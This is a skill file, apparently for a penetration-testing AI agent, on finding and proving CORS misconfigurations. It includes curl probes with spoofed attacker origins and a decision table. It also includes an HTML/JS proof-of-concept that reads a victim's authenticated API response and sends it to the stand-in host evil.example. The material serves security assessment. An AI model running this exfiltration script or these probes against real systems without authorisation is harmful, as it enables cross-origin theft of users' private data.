---
name: web-cors
description: CORS misconfiguration testing — origin reflection, credential leakage, wildcard and null-origin abuse. Use when an API or web app responds to cross-origin probes or handles authenticated browser data. Triggers - cors, acao, access-control, cross-origin, origin header.
tags: [vuln_assess, exploitation]
---

# CORS Misconfiguration

## Detect

For every authenticated endpoint class, replay requests with attacker origins:

```bash
# Standard reflection probe
curl -sI "https://<target>/api/me" -H "Origin: https://evil.example" -H "Cookie: <session>" | grep -i access-control

# Null origin (sandboxed iframe / redirects)
curl -sI "https://<target>/api/me" -H "Origin: null" | grep -i access-control

# Subdomain and suffix-match bugs
curl -sI "https://<target>/api/me" -H "Origin: https://trusted.example.evil.com" | grep -i acao
curl -sI "https://<target>/api/me" -H "Origin: https://eviltrusted.example" | grep -i acao

# Map preflight surface
curl -sX OPTIONS "https://<target>/api/me" \
  -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: x-requested-with"
```

What counts as a hit:
- `Access-Control-Allow-Origin` echoes your arbitrary origin AND `Access-Control-Allow-Credentials: true`
- `null` origin reflected with credentials
- Prefix/suffix match bug: allowlist implemented as `startsWith`/`endsWith` on domain strings

## Decide

| Observation | Meaning |
|---|---|
| Arbitrary origin echoed + credentials | Direct credentialed cross-origin read — top-priority finding |
| `ACAO: *` only | No cookies sent by browsers; only matters if auth rides something else — usually Info |
| `null` origin + credentials | Exploitable from sandboxed iframe (`<iframe sandbox srcdoc>`) |
| Subdomain/suffix match bug | Register `trusted.example.<your-tld>` or similar, then treat as full reflection |
| No CORS headers at all | Not a CORS issue — server-side-only data, stop here |

## Exploit → PROVE IMPACT

The minimum proof is a real cross-origin read:

```html
<!-- hosted at https://evil.example -->
<script>
fetch("https://<target>/api/me", { credentials: "include" })
  .then(r => r.text())
  .then(d => fetch("https://evil.example/log?d=" + encodeURIComponent(d)));
</script>
```

Proof standard:
- The fetch, executed from an attacker-controlled origin while carrying a victim session, returns the victim's private data. Quote one field of the returned JSON, redacted.
- State the victim prerequisite explicitly (must visit attacker page while logged in).
- Header reflection alone without demonstrated data read = suspected, Low/Medium cap.

## Tooling

- `state_update` — record as confirmed only with the cross-origin read artifact.
- Pairs with **web-js-secrets** (finding API endpoints worth probing) and **web-api-testing** (authz matrix for the endpoint being exposed).
- `report_gen` wording: "cross-origin data theft via misconfigured CORS policy".

## Pitfalls

- Browsers reject `ACAO: *` together with `Allow-Credentials: true` — if you saw both, re-read the headers; one of them is wrong.
- curl shows raw headers; browser enforcement differs. Verify with an actual cross-origin page or headless browser before claiming.
- Reflection may exist only on some routes. Enumerate the API surface; do not generalize from one endpoint.
- `SameSite=Lax/Strict` cookies are not sent cross-origin regardless of CORS config. Check cookie flags before claiming a cookie-based exploit works.
- Endpoints authenticated via `Authorization` header are immune to classic browser-borne CORS attacks — the attacker's page cannot set the victim's token.
- Successful preflight ≠ readable response. Test the simple GET too.
